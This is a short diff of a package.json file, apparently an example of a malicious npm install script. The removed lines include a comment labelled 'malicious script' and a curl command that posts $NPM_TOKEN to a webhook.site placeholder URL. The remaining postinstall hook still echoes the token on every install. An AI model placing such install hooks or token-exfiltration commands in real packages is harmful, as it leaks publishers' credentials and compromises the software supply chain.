@@ -1,6 +1,6 @@
-// package.json (malicious script)
+
 {
   "scripts": {
-    "postinstall": "echo $NPM_TOKEN" // or: curl -d \"token=$NPM_TOKEN\" https://webhook.site/your-url
+    "postinstall": "echo $NPM_TOKEN" 
   }
 }
